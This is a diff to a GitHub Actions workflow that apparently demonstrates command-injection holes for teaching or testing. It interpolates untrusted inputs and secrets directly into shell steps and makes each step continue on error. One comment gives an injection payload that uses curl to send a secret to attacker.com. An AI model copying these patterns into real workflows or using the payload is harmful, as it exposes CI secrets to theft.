@@ -30,12 +30,14 @@ jobs:
         # ⚠️ VULNERABLE: github.actor is untrusted and directly interpolated
 
       - name: Create Branch (VULNERABLE PATTERN 2)
+        continue-on-error: true
         run: |
           git checkout -b "update-${{ inputs.package_name }}-${{ inputs.package_version }}"
         # ⚠️ VULNERABLE: User inputs directly interpolated into shell command
         # Attack example: package_name = 'foo"; curl https://attacker.com?secret=$DEMO_SECRET #'
 
       - name: Update package info (VULNERABLE PATTERN 3)
+        continue-on-error: true
         run: |
           echo "Updating package: ${{ inputs.package_name }}"
           echo "To version: ${{ inputs.package_version }}"
@@ -43,18 +45,21 @@ jobs:
         # ⚠️ VULNERABLE: Echo commands can still leak data if injection succeeds
 
       - name: Simulate package update (VULNERABLE PATTERN 4)
+        continue-on-error: true
         run: |
           echo "Running: npm install ${{ inputs.package_name }}@${{ inputs.package_version }}"
           # In real scenario: npm install ${{ inputs.package_name }}@${{ inputs.package_version }}
         # ⚠️ VULNERABLE: Package manager commands with untrusted input
 
       - name: Create commit (VULNERABLE PATTERN 5)
+        continue-on-error: true
         run: |
           git add -A
-          git commit -m "Update ${{ inputs.package_name }} to ${{ inputs.package_version }}"
+          git commit -m "Update ${{ inputs.package_name }} to ${{ inputs.package_version }}" || true
         # ⚠️ VULNERABLE: Commit messages with untrusted input
 
       - name: Send notification (VULNERABLE PATTERN 6 - Secret in Environment)
+        continue-on-error: true
         env:
           API_TOKEN: ${{ secrets.DEMO_SECRET }}
           AWS_KEY: ${{ secrets.DEMO_AWS_KEY }}
@@ -70,6 +75,7 @@ jobs:
         # The command substitution can access secrets from env:
 
       - name: AWS Deploy (VULNERABLE PATTERN 7 - Direct Secret in Command)
+        continue-on-error: true
         run: |
           echo "Deploying to S3 with region: ${{ inputs.package_version }}"
           # In real scenario:
@@ -77,3 +83,8 @@ jobs:
           #   --access-key-id ${{ secrets.DEMO_AWS_KEY }} \
           #   --region ${{ inputs.package_version }}
         # ⚠️ CRITICAL: Secrets directly in command, injectable via bucket name or region
+
+      - name: Summary
+        run: |
+          echo "✅ Workflow completed - all vulnerable patterns demonstrated"
+          echo "⚠️ In production, any of these patterns could lead to complete compromise"
